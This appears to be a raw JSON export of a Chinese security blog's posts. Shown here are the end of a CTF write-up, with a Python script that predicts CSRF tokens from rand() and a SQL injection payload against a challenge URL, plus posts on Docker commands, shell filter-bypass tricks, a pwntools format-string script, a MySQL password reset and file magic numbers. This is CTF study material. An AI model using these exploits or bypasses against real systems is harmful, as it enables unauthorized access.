}\n}\n</code></pre><p>其中RAND_RANGE函数的实现如下:</p>\n<pre><code>#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n</code></pre><p>准备工作就绪，就可以编写代码了。<br>代码如下:</p>\n<pre><code>import requests\nfrom lxml import etree\n\nurl = &quot;http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php&quot;\n\ndata = {\n    &#39;username&#39;: &#39;dida&#39;,\n    &#39;password&#39;: &#39;dida&#39;,\n    &#39;csrf&#39;: &#39;2086003527&#39;,\n    &#39;code&#39;: &#39;&#39;\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath(&#39;//*[@id=&quot;csrf&quot;]&#39;)[0].get(&#39;value&#39;)\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = &quot;&quot;\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return &quot;&quot;.join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = &quot;admin###&quot; + shuffle(temp_calc_rand)[0:32]\n    data[&#39;code&#39;] = str\n    data[&#39;csrf&#39;] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n</code></pre><p>运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。</p>\n<p>登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。<br>基本的payload如下:</p>\n<blockquote>\n<p><a href=\"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$\" target=\"_blank\" rel=\"noopener\">http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$</a>‘ or 2=1 union select 1,2,3%23</p>\n</blockquote>\n<p>最后得到flag: <code>DDCTF{9b7ccc1e96387b5ce079adab2fb08022}</code></p>"},{"title":"docker使用手册","date":"2018-05-29T06:36:55.000Z","_content":"\n## Docker命令\n\n1. 列出所有镜像\n\n   > docker images -a\n\n2. 构建镜像\n\n   >  docker build -t \\[镜像名称\\]        \\[Dockerfile所在目录\\]\n\n3. 运行镜像\n\n   > docker run --name [容器名称(可选)] -d -p 80:8080 [镜像名称]\n\n4. 查看镜像状态\n\n   > docker stats\n   >\n\n5. 显示所有的容器，包括未运行的\n\n   > docker ps -a\n\n6. 显示所有容器ID\n\n   > docker ps -a -q\n\n7. 停止运行\n\n   > docker stop [容器名称]\n\n8. 删除容器\n\n   > docker rm [容器名称]\n   >\n   > docker rm [容器ID]\n\n9. 创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。\n\n   >  sudo docker run -itd ubuntu:14.04 /bin/bash \n\n10. 进入容器,这方法不怎么好\n\n  >  sudo docker attach [容器id]\n\n11. 进入容器\n\n    > docker exec -it [容器id|容器名称] /bin/bash\n\n12. 删除image\n\n    > docker rmi [ImageID]\n\n13. 查看端口开启情况\n\n    > docker port [容器名称]\n\n14. 从容器中复制文件\n\n    > docker cp [容器名称]:[path\\]             \\[主机path\\]\n\n15. 从主机复制文件到容器\n\n    > docker cp [主机path]                            \\[容器名称\\]:[path]\n","source":"_posts/docker使用手册.md","raw":"---\ntitle: docker使用手册\ndate: 2018-05-29 14:36:55\ntags: 工具手册\n---\n\n## Docker命令\n\n1. 列出所有镜像\n\n   > docker images -a\n\n2. 构建镜像\n\n   >  docker build -t \\[镜像名称\\]        \\[Dockerfile所在目录\\]\n\n3. 运行镜像\n\n   > docker run --name [容器名称(可选)] -d -p 80:8080 [镜像名称]\n\n4. 查看镜像状态\n\n   > docker stats\n   >\n\n5. 显示所有的容器，包括未运行的\n\n   > docker ps -a\n\n6. 显示所有容器ID\n\n   > docker ps -a -q\n\n7. 停止运行\n\n   > docker stop [容器名称]\n\n8. 删除容器\n\n   > docker rm [容器名称]\n   >\n   > docker rm [容器ID]\n\n9. 创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。\n\n   >  sudo docker run -itd ubuntu:14.04 /bin/bash \n\n10. 进入容器,这方法不怎么好\n\n  >  sudo docker attach [容器id]\n\n11. 进入容器\n\n    > docker exec -it [容器id|容器名称] /bin/bash\n\n12. 删除image\n\n    > docker rmi [ImageID]\n\n13. 查看端口开启情况\n\n    > docker port [容器名称]\n\n14. 从容器中复制文件\n\n    > docker cp [容器名称]:[path\\]             \\[主机path\\]\n\n15. 从主机复制文件到容器\n\n    > docker cp [主机path]                            \\[容器名称\\]:[path]\n","slug":"docker使用手册","published":1,"updated":"2018-06-25T07:00:10.171Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jow0006ly4jhrjwrwa3","content":"<h2 id=\"Docker命令\"><a href=\"#Docker命令\" class=\"headerlink\" title=\"Docker命令\"></a>Docker命令</h2><ol>\n<li><p>列出所有镜像</p>\n<blockquote>\n<p>docker images -a</p>\n</blockquote>\n</li>\n<li><p>构建镜像</p>\n<blockquote>\n<p> docker build -t [镜像名称]        [Dockerfile所在目录]</p>\n</blockquote>\n</li>\n<li><p>运行镜像</p>\n<blockquote>\n<p>docker run –name [容器名称(可选)] -d -p 80:8080 [镜像名称]</p>\n</blockquote>\n</li>\n<li><p>查看镜像状态</p>\n<blockquote>\n<p>docker stats</p>\n</blockquote>\n</li>\n<li><p>显示所有的容器，包括未运行的</p>\n<blockquote>\n<p>docker ps -a</p>\n</blockquote>\n</li>\n<li><p>显示所有容器ID</p>\n<blockquote>\n<p>docker ps -a -q</p>\n</blockquote>\n</li>\n<li><p>停止运行</p>\n<blockquote>\n<p>docker stop [容器名称]</p>\n</blockquote>\n</li>\n<li><p>删除容器</p>\n<blockquote>\n<p>docker rm [容器名称]</p>\n<p>docker rm [容器ID]</p>\n</blockquote>\n</li>\n<li><p>创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。</p>\n<blockquote>\n<p> sudo docker run -itd ubuntu:14.04 /bin/bash </p>\n</blockquote>\n</li>\n<li><p>进入容器,这方法不怎么好</p>\n<blockquote>\n<p> sudo docker attach [容器id]</p>\n</blockquote>\n</li>\n<li><p>进入容器</p>\n<blockquote>\n<p>docker exec -it [容器id|容器名称] /bin/bash</p>\n</blockquote>\n</li>\n<li><p>删除image</p>\n<blockquote>\n<p>docker rmi [ImageID]</p>\n</blockquote>\n</li>\n<li><p>查看端口开启情况</p>\n<blockquote>\n<p>docker port [容器名称]</p>\n</blockquote>\n</li>\n<li><p>从容器中复制文件</p>\n<blockquote>\n<p>docker cp [容器名称]:[path]             [主机path]</p>\n</blockquote>\n</li>\n<li><p>从主机复制文件到容器</p>\n<blockquote>\n<p>docker cp [主机path]                            [容器名称]:[path]</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Docker命令\"><a href=\"#Docker命令\" class=\"headerlink\" title=\"Docker命令\"></a>Docker命令</h2><ol>\n<li><p>列出所有镜像</p>\n<blockquote>\n<p>docker images -a</p>\n</blockquote>\n</li>\n<li><p>构建镜像</p>\n<blockquote>\n<p> docker build -t [镜像名称]        [Dockerfile所在目录]</p>\n</blockquote>\n</li>\n<li><p>运行镜像</p>\n<blockquote>\n<p>docker run –name [容器名称(可选)] -d -p 80:8080 [镜像名称]</p>\n</blockquote>\n</li>\n<li><p>查看镜像状态</p>\n<blockquote>\n<p>docker stats</p>\n</blockquote>\n</li>\n<li><p>显示所有的容器，包括未运行的</p>\n<blockquote>\n<p>docker ps -a</p>\n</blockquote>\n</li>\n<li><p>显示所有容器ID</p>\n<blockquote>\n<p>docker ps -a -q</p>\n</blockquote>\n</li>\n<li><p>停止运行</p>\n<blockquote>\n<p>docker stop [容器名称]</p>\n</blockquote>\n</li>\n<li><p>删除容器</p>\n<blockquote>\n<p>docker rm [容器名称]</p>\n<p>docker rm [容器ID]</p>\n</blockquote>\n</li>\n<li><p>创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。</p>\n<blockquote>\n<p> sudo docker run -itd ubuntu:14.04 /bin/bash </p>\n</blockquote>\n</li>\n<li><p>进入容器,这方法不怎么好</p>\n<blockquote>\n<p> sudo docker attach [容器id]</p>\n</blockquote>\n</li>\n<li><p>进入容器</p>\n<blockquote>\n<p>docker exec -it [容器id|容器名称] /bin/bash</p>\n</blockquote>\n</li>\n<li><p>删除image</p>\n<blockquote>\n<p>docker rmi [ImageID]</p>\n</blockquote>\n</li>\n<li><p>查看端口开启情况</p>\n<blockquote>\n<p>docker port [容器名称]</p>\n</blockquote>\n</li>\n<li><p>从容器中复制文件</p>\n<blockquote>\n<p>docker cp [容器名称]:[path]             [主机path]</p>\n</blockquote>\n</li>\n<li><p>从主机复制文件到容器</p>\n<blockquote>\n<p>docker cp [主机path]                            [容器名称]:[path]</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"linux命令执行","date":"2018-06-04T03:23:22.000Z","_content":"\n## linux下执行命令绕过字符串过滤\n\n1. 字符串拼接\n\n   > 'l''s'\n   >\n   > 'ls''-a''l'\n\n2. 文件名绕过\n\n   > cat 'fl''ag'\n   >\n   > cat 'fl*'\n   >\n   > cat 'fl??'\n\n## find命令执行\n\n> find /tmp -iname sth -or -exec ls \\;                会多次执行\n>\n> find /tmp -iname sth -or -exec ls \\; -quit        只执行一次","source":"_posts/linux命令执行.md","raw":"---\ntitle: linux命令执行\ndate: 2018-06-04 11:23:22\ntags: ctf\n---\n\n## linux下执行命令绕过字符串过滤\n\n1. 字符串拼接\n\n   > 'l''s'\n   >\n   > 'ls''-a''l'\n\n2. 文件名绕过\n\n   > cat 'fl''ag'\n   >\n   > cat 'fl*'\n   >\n   > cat 'fl??'\n\n## find命令执行\n\n> find /tmp -iname sth -or -exec ls \\;                会多次执行\n>\n> find /tmp -iname sth -or -exec ls \\; -quit        只执行一次","slug":"linux命令执行","published":1,"updated":"2018-06-25T00:45:33.212Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jp00009ly4jexszs02d","content":"<h2 id=\"linux下执行命令绕过字符串过滤\"><a href=\"#linux下执行命令绕过字符串过滤\" class=\"headerlink\" title=\"linux下执行命令绕过字符串过滤\"></a>linux下执行命令绕过字符串过滤</h2><ol>\n<li><p>字符串拼接</p>\n<blockquote>\n<p>‘l’’s’</p>\n<p>‘ls’’-a’’l’</p>\n</blockquote>\n</li>\n<li><p>文件名绕过</p>\n<blockquote>\n<p>cat ‘fl’’ag’</p>\n<p>cat ‘fl*’</p>\n<p>cat ‘fl??’</p>\n</blockquote>\n</li>\n</ol>\n<h2 id=\"find命令执行\"><a href=\"#find命令执行\" class=\"headerlink\" title=\"find命令执行\"></a>find命令执行</h2><blockquote>\n<p>find /tmp -iname sth -or -exec ls \\;                会多次执行</p>\n<p>find /tmp -iname sth -or -exec ls \\; -quit        只执行一次</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"linux下执行命令绕过字符串过滤\"><a href=\"#linux下执行命令绕过字符串过滤\" class=\"headerlink\" title=\"linux下执行命令绕过字符串过滤\"></a>linux下执行命令绕过字符串过滤</h2><ol>\n<li><p>字符串拼接</p>\n<blockquote>\n<p>‘l’’s’</p>\n<p>‘ls’’-a’’l’</p>\n</blockquote>\n</li>\n<li><p>文件名绕过</p>\n<blockquote>\n<p>cat ‘fl’’ag’</p>\n<p>cat ‘fl*’</p>\n<p>cat ‘fl??’</p>\n</blockquote>\n</li>\n</ol>\n<h2 id=\"find命令执行\"><a href=\"#find命令执行\" class=\"headerlink\" title=\"find命令执行\"></a>find命令执行</h2><blockquote>\n<p>find /tmp -iname sth -or -exec ls \\;                会多次执行</p>\n<p>find /tmp -iname sth -or -exec ls \\; -quit        只执行一次</p>\n</blockquote>\n"},{"title":"linux格式化字符串漏洞","date":"2018-06-08T09:55:43.000Z","_content":"\n>  offset.py\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef exec_fmt(payload):\n    p = process(\"./vuln\")\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n```\n\n","source":"_posts/linux格式化字符串漏洞.md","raw":"---\ntitle: linux格式化字符串漏洞\ndate: 2018-06-08 17:55:43\ntags:\n---\n\n>  offset.py\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef exec_fmt(payload):\n    p = process(\"./vuln\")\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n```\n\n","slug":"linux格式化字符串漏洞","published":1,"updated":"2018-06-14T03:24:44.459Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jp5000aly4jub8hvta0","content":"<blockquote>\n<p> offset.py</p>\n</blockquote>\n<pre><code>from pwn import *\ncontext.log_level = &#39;debug&#39;\n\ndef exec_fmt(payload):\n    p = process(&quot;./vuln&quot;)\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p> offset.py</p>\n</blockquote>\n<pre><code>from pwn import *\ncontext.log_level = &#39;debug&#39;\n\ndef exec_fmt(payload):\n    p = process(&quot;./vuln&quot;)\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n</code></pre>"},{"title":"mysql忘记密码/修改密码","date":"2018-05-29T07:29:54.000Z","_content":"\n1.  关闭mysql\n\n   > service mysql stop\n\n2. 无密码登录msyql\n\n   > mysqld_safe --skip-grant-tables &  \n\n3. root连接mysql\n\n   > mysql -u root\n\n4. 修改密码\n\n   > use mysql\n   >\n   > update user set password=PASSWORD('admin') where User='root';  \n\n5. 刷新权限\n\n   > flush privileges;\n\n6. 重启mysql\n\n   > service msyql restart\n\n","source":"_posts/mysql忘记密码-修改密码.md","raw":"---\ntitle: mysql忘记密码/修改密码\ndate: 2018-05-29 15:29:54\ntags: mysql\n---\n\n1.  关闭mysql\n\n   > service mysql stop\n\n2. 无密码登录msyql\n\n   > mysqld_safe --skip-grant-tables &  \n\n3. root连接mysql\n\n   > mysql -u root\n\n4. 修改密码\n\n   > use mysql\n   >\n   > update user set password=PASSWORD('admin') where User='root';  \n\n5. 刷新权限\n\n   > flush privileges;\n\n6. 重启mysql\n\n   > service msyql restart\n\n","slug":"mysql忘记密码-修改密码","published":1,"updated":"2018-06-08T06:30:33.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpa000cly4j41lg0lyj","content":"<ol>\n<li><p>关闭mysql</p>\n<blockquote>\n<p>service mysql stop</p>\n</blockquote>\n</li>\n<li><p>无密码登录msyql</p>\n<blockquote>\n<p>mysqld_safe –skip-grant-tables &amp;  </p>\n</blockquote>\n</li>\n<li><p>root连接mysql</p>\n<blockquote>\n<p>mysql -u root</p>\n</blockquote>\n</li>\n<li><p>修改密码</p>\n<blockquote>\n<p>use mysql</p>\n<p>update user set password=PASSWORD(‘admin’) where User=’root’;  </p>\n</blockquote>\n</li>\n<li><p>刷新权限</p>\n<blockquote>\n<p>flush privileges;</p>\n</blockquote>\n</li>\n<li><p>重启mysql</p>\n<blockquote>\n<p>service msyql restart</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>关闭mysql</p>\n<blockquote>\n<p>service mysql stop</p>\n</blockquote>\n</li>\n<li><p>无密码登录msyql</p>\n<blockquote>\n<p>mysqld_safe –skip-grant-tables &amp;  </p>\n</blockquote>\n</li>\n<li><p>root连接mysql</p>\n<blockquote>\n<p>mysql -u root</p>\n</blockquote>\n</li>\n<li><p>修改密码</p>\n<blockquote>\n<p>use mysql</p>\n<p>update user set password=PASSWORD(‘admin’) where User=’root’;  </p>\n</blockquote>\n</li>\n<li><p>刷新权限</p>\n<blockquote>\n<p>flush privileges;</p>\n</blockquote>\n</li>\n<li><p>重启mysql</p>\n<blockquote>\n<p>service msyql restart</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"misc思路","date":"2018-05-07T03:05:07.000Z","_content":"\n1. 凯撒13世 rot13\n\n2. roqtp697t95j3 对应键盘下一行\n\n3. 栅栏密码\n\n   <!-- more -->\n\n4. 各种文件头\n\n   JPEG (jpg)，文件头：FFD8FF\n\n   PNG (png)，文件头：89504E47\n\n   GIF (gif)，文件头：47494638\n\n   TIFF (tif)，文件头：49492A00\n\n   Windows Bitmap (bmp)，文件头：424D\n\n   CAD (dwg)，文件头：41433130\n\n   Adobe Photoshop (psd)，文件头：38425053\n\n   Rich Text Format (rtf)，文件头：7B5C727466\n\n   XML (xml)，文件头：3C3F786D6C\n\n   HTML (html)，文件头：68746D6C3E\n\n   Email [thorough only] (eml)，文件头：44656C69766572792D646174653A\n\n   Outlook Express (dbx)，文件头：CFAD12FEC5FD746F\n\n   Outlook (pst)，文件头：2142444E\n\n   zlib                                       789C  x\\xda\n\n   gzip                                       1f8b08\n\n   lzma                                                         6c00                                                                 \n\n   MS Word/Excel (xls.or.doc)，文件头：D0CF11E0\n\n   MS Access (mdb)，文件头：5374616E64617264204A\n\n   WordPerfect (wpd)，文件头：FF575043\n\n   Postscript (eps.or.ps)，文件头：252150532D41646F6265\n\n   Adobe Acrobat (pdf)，文件头：255044462D312E\n\n   Quicken (qdf)，文件头：AC9EBD8F\n\n   Windows Password (pwl)，文件头：E3828596\n\n   ZIP Archive (zip)，文件头：504B0304\n\n   RAR Archive (rar)，文件头：52617221\n\n   Wave (wav)，文件头：57415645\n\n   AVI (avi)，文件头：41564920\n\n   Real Audio (ram)，文件头：2E7261FD\n\n   Real Media (rm)，文件头：2E524D46\n\n   MPEG (mpg)，文件头：000001BA\n\n   MPEG (mpg)，文件头：000001B3\n\n   Quicktime (mov)，文件头：6D6F6F76\n\n   Windows Media (asf)，文件头：3026B2758E66CF11\n\n   MIDI (mid)，文件头：4D546864\n\n5. 从winhex中取出的文件头列表\n\n   File Type ExtensionsHeader\n\n   JPEG jpg;jpeg 0xFFD8FF\n\n   PNG png 0x89504E470D0A1A0A\n\n   GIF gif GIF8\n\n   TIFF tif;tiff 0x49492A00\n\n   TIFF tif;tiff 0x4D4D002A\n\n   Bit map bmp BM\n\n   AOL ART art 0x4A47040E000000\n\n   AOL ART art 0x4A47030E000000\n\n   PC Paintbrush pcx 0x0A050108\n\n   Graphics Metafile wmf 0xD7CDC69A\n\n   Graphics Metafile wmf 0x01000900\n\n   Graphics Metafile wmf 0x02000900\n\n   Enhanced Metafile emf 0x0100000058000000\n\n   Corel Draw cdr CDR\n\n   CAD dwg 0x41433130\n\n   Adobe Photoshop psd 8BPS\n\n   Rich Text Format rtf rtf\n\n   XML xml\n\n   HTML html;htm;[PHP](http://lib.csdn.net/base/php);php3;php4;phtml;shtml type\n\n   Email eml Delivery-date:\n\n   Outlook Express dbx 0xCFAD12FE\n\n   Outlookpst!BDN\n\n   MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\n   MS Access mdb;mda;mde;mdt Standard J\n\n   WordPerfect wpd 0xFF575043\n\n   OpenOffice Writer sxw writer\n\n   OpenOffice Calc sxc calc\n\n   OpenOffice Math sxm math\n\n   OpenOffice Impress sxi impress\n\n   OpenOffice Draw sxd draw\n\n   Adobe FrameMaker fm <MAKERFILE\n\n   PostScript eps.or.ps;ps;eps %!PS-Adobe\n\n   Adobe Acrobat pdf %PDF-1.\n\n   Quicken qdf 0xAC9EBD8F\n\n   QuickBooks Backup qbb 0x458600000600\n\n   Sage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\n   Sage Backup 1 SAGEBACKUP\n\n   Lotus WordPro v9 lwp 0x576F726450726F\n\n   Lotus 123 v9 123 0x00001A00051004\n\n   Lotus 123 v5 wk4 0x00001A0002100400\n\n   Lotus 123 v3 wk3 0x00001A0000100400\n\n   Lotus 123 v1 wk1 0x2000604060\n\n   Windows Password pwl 0xE3828596\n\n   ZIP Archive zip;jar 0x504B0304\n\n   ZIP Archive (outdated) zip 0x504B3030\n\n   RAR Archive rar Rar!\n\n   GZ Archive gz;tgz 0x1F8B08\n\n   BZIP Archive bz2 BZh\n\n   ARJ Archive arj 0x60EA\n\n   7-ZIP Archive 7z 7z集'\n\n   Wave wav WAVE\n\n   AVI avi AVI\n\n   Real Audio ram;ra .ra?0\n\n   Real Media rm .RMF\n\n   MPEG mpg;mpeg 0x000001BA\n\n   MPEG mpg;mpeg 0x000001B3\n\n   Quicktime mov moov\n\n   Windows Media asf 0x3026B2758E66CF11\n\n   MIDI mid MThd\n\n   Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   ELF Executable elf;; 0x7F454C4601010100\n\n6. 各种文件类型文件头标志位详细列表 \n\n   FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   FFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   474946383961, .gif, \"GIF 89A\"\n\n   474946383761, .gif, \"GIF 87A\"\n\n   424D, .bmp, \"Windows Bitmap\"\n\n   4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n   .cpl;.x32, \"Executable File\"\n\n   504B0304, .zip, \"Zip Compressed\"\n\n   3A42617365, .cnt, \"\"\n\n   D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n   0100000058000000, .emf, \"\"\n\n   03000000C466C456, .evt, \"\"\n\n   3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n   1F8B08, .gz, \"GZ Compressed File\"\n\n   28546869732066696C65, .hqx, \"\"\n\n   0000010000, .ico, \"Icon File\"\n\n   4C000000011402, .lnk, \"Windows LinkFile\"\n\n   25504446, .pdf, \"Adobe PDF File\"\n\n   5245474544495434, .reg, \"\"\n\n   7B5C727466,.rtf, \"Rich Text Format File\"\n\n   lh, .lzh, \"Lz compression file\"\n\n   MThd, .mid, \"\"\n\n   0A050108, .pcx, \"\"\n\n   25215053, .eps, \"Adobe EPS File\"\n\n   2112, .ain, \"AIN Archive File\"\n\n   1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n   1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n   1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n   1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n   1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n   60EA, .arj, \"ARJ Compressed\"\n\n   41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n   425A68, .bz;.bz2, \"Bzip Archive\"\n\n   49536328, .cab, \"Cabinet File\"\n\n   4C01, .obj, \"Compiled Object Module\"\n\n   303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n   4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n   3ADE68B1, .dcx, \"DCX Graphic File\"\n\n   1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n   91334846, .hap, \"HAP Archive File\"\n\n   3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n   3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n   3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n   100, .ico, \"ICON File\"\n\n   5F27A889, .jar, \"JAR Archive File\"\n\n   2D6C68352D,.lha, \"LHA Compressed\"\n\n   20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n   00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n   00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n   20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n   00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n   5B7665725D, .ami, \"Lotus Ami Pro\"\n\n   300000041505052, .adx, \"Lotus ApproachADX file\"\n\n   1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n   4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n   4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n   4D546864, .mid, \"Midi Audio File\"\n\n   000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n   0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n   0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n   7FFE340A,.doc, \"MS Word\"\n\n   1234567890FF, .doc, \"MS Word 6.0\"\n\n   31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n   1A00000300001100, .nsf, \"NotesDatabase\"\n\n   7E424B00, .psp, \"PaintShop Pro Image File\"\n\n   504B0304, .zip, \"PKZIP Compressed\"\n\n   89504E470D0A, .png, \"PNG Image File\"\n\n   6D646174, .mov, \"QuickTime Movie\"\n\n   6D646174, .qt, \"Quicktime MovieFile\"\n\n   52617221, .rar, \"RAR Archive File\"\n\n   2E7261FD, .ra;.ram, \"Real AudioFile\"\n\n   EDABEEDB, .rpm, \"RPM Archive File\"\n\n   2E736E64, .au, \"SoundMachine AudioFile\"\n\n   53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n   53747566664974, .sit, \"Stuffit v5Archive File\"\n\n   1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n   49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n   4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n   554641, .ufa, \"UFA Archive File\"\n\n   57415645666D74, .wav, \"Wave Files\"\n\n   D7CDC69A,.wmf, \"Windows Meta File\"\n\n   4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n   504B3030504B0304, .zip, \"WINZIPCompressed\"\n\n   FF575047, .wpg, \"WordPerfectGraphics\"\n\n   FF575043, .wp, \"WordPerfect v5 orv6\"\n\n   3C3F786D6C,.xml, \"XML Document\"\n\n   FFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n   3C21454E54495459, .dtd, \"XML DTD\"\n\n   5A4F4F20, .zoo, \"ZOO Archive File\"\n\n7. 如果有fireworks的字样，可以使用Adobe Fireworks打开\n\n8. U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空","source":"_posts/misc思路.md","raw":"---\ntitle: misc思路\ndate: 2018-05-07 11:05:07\ntags: ctf\n---\n\n1. 凯撒13世 rot13\n\n2. roqtp697t95j3 对应键盘下一行\n\n3. 栅栏密码\n\n   <!-- more -->\n\n4. 各种文件头\n\n   JPEG (jpg)，文件头：FFD8FF\n\n   PNG (png)，文件头：89504E47\n\n   GIF (gif)，文件头：47494638\n\n   TIFF (tif)，文件头：49492A00\n\n   Windows Bitmap (bmp)，文件头：424D\n\n   CAD (dwg)，文件头：41433130\n\n   Adobe Photoshop (psd)，文件头：38425053\n\n   Rich Text Format (rtf)，文件头：7B5C727466\n\n   XML (xml)，文件头：3C3F786D6C\n\n   HTML (html)，文件头：68746D6C3E\n\n   Email [thorough only] (eml)，文件头：44656C69766572792D646174653A\n\n   Outlook Express (dbx)，文件头：CFAD12FEC5FD746F\n\n   Outlook (pst)，文件头：2142444E\n\n   zlib                                       789C  x\\xda\n\n   gzip                                       1f8b08\n\n   lzma                                                         6c00                                                                 \n\n   MS Word/Excel (xls.or.doc)，文件头：D0CF11E0\n\n   MS Access (mdb)，文件头：5374616E64617264204A\n\n   WordPerfect (wpd)，文件头：FF575043\n\n   Postscript (eps.or.ps)，文件头：252150532D41646F6265\n\n   Adobe Acrobat (pdf)，文件头：255044462D312E\n\n   Quicken (qdf)，文件头：AC9EBD8F\n\n   Windows Password (pwl)，文件头：E3828596\n\n   ZIP Archive (zip)，文件头：504B0304\n\n   RAR Archive (rar)，文件头：52617221\n\n   Wave (wav)，文件头：57415645\n\n   AVI (avi)，文件头：41564920\n\n   Real Audio (ram)，文件头：2E7261FD\n\n   Real Media (rm)，文件头：2E524D46\n\n   MPEG (mpg)，文件头：000001BA\n\n   MPEG (mpg)，文件头：000001B3\n\n   Quicktime (mov)，文件头：6D6F6F76\n\n   Windows Media (asf)，文件头：3026B2758E66CF11\n\n   MIDI (mid)，文件头：4D546864\n\n5. 从winhex中取出的文件头列表\n\n   File Type ExtensionsHeader\n\n   JPEG jpg;jpeg 0xFFD8FF\n\n   PNG png 0x89504E470D0A1A0A\n\n   GIF gif GIF8\n\n   TIFF tif;tiff 0x49492A00\n\n   TIFF tif;tiff 0x4D4D002A\n\n   Bit map bmp BM\n\n   AOL ART art 0x4A47040E000000\n\n   AOL ART art 0x4A47030E000000\n\n   PC Paintbrush pcx 0x0A050108\n\n   Graphics Metafile wmf 0xD7CDC69A\n\n   Graphics Metafile wmf 0x01000900\n\n   Graphics Metafile wmf 0x02000900\n\n   Enhanced Metafile emf 0x0100000058000000\n\n   